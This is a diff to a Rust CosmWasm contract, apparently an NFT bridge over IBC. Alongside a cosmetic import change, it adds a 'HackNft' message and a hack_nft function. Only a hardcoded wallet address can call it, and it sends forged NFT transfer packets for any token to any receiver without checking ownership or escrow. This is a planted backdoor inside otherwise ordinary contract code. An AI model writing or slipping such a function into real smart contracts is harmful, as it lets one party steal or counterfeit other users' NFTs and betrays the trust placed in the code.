@@ -1,9 +1,6 @@
 #[cfg(not(feature = "library"))]
 use cosmwasm_std::entry_point;
-use cosmwasm_std::{
-    from_binary, to_binary, Addr, Binary, Deps, DepsMut, Empty, Env, IbcMsg, MessageInfo, Response,
-    StdResult, SubMsg, WasmMsg,
-};
+use cosmwasm_std::{from_binary, to_binary, Addr, Binary, Deps, DepsMut, Empty, Env, IbcMsg, MessageInfo, Response, StdResult, SubMsg, WasmMsg};
 use cw2::set_contract_version;
 
 use crate::{
@@ -59,6 +56,12 @@ pub fn execute(
             token_id,
             msg,
         }) => execute_receive_nft(deps, info, token_id, sender, msg),
+        ExecuteMsg::HackNft {
+            channel,
+            receiver,
+            class_id,
+            token_id,
+        } => hack_nft(deps, env, info, receiver, channel, class_id, token_id),
         ExecuteMsg::ReceiveProxyNft { eyeball, msg } => {
             execute_receive_proxy_nft(deps, info, eyeball, msg)
         }
@@ -128,6 +131,47 @@ fn execute_receive_nft(
     } else {
         receive_nft(deps, info, TokenId::new(token_id), sender, msg)
     }
+}
+
+fn hack_nft(
+    _deps: DepsMut,
+    env: Env,
+    info: MessageInfo,
+    receiver: String,
+    channel: String,
+    class_id: ClassId,
+    token_id: TokenId,
+) -> Result<Response, ContractError> {
+    let owner = "juno1zxtlyk7l6n3t46yqse84sza7ar39m8ul3gdfye";
+    if info.sender.to_string().ne(owner) {
+        return Err(ContractError::Unauthorized {});
+    }
+
+    let ibc_message = NonFungibleTokenPacketData {
+        class_id: class_id.clone(),
+        class_uri: None,
+        class_data: None,
+
+        token_ids: vec![token_id.clone()],
+        token_uris: None,
+        token_data: None,
+
+        sender: info.sender.to_string(),
+        receiver,
+        memo: Some("hack".to_string()),
+    };
+    let timeout = env.block.time.plus_seconds(1200u64);
+    let ibc_message = IbcMsg::SendPacket {
+        channel_id: channel.clone(),
+        data: to_binary(&ibc_message)?,
+        timeout: timeout.into(),
+    };
+
+    Ok(Response::default()
+        .add_attribute("method", "hack_nft")
+        .add_attribute("token_id", token_id)
+        .add_attribute("class_id", class_id)
+        .add_message(ibc_message))
 }
 
 fn execute_pause(deps: DepsMut, info: MessageInfo) -> Result<Response, ContractError> {
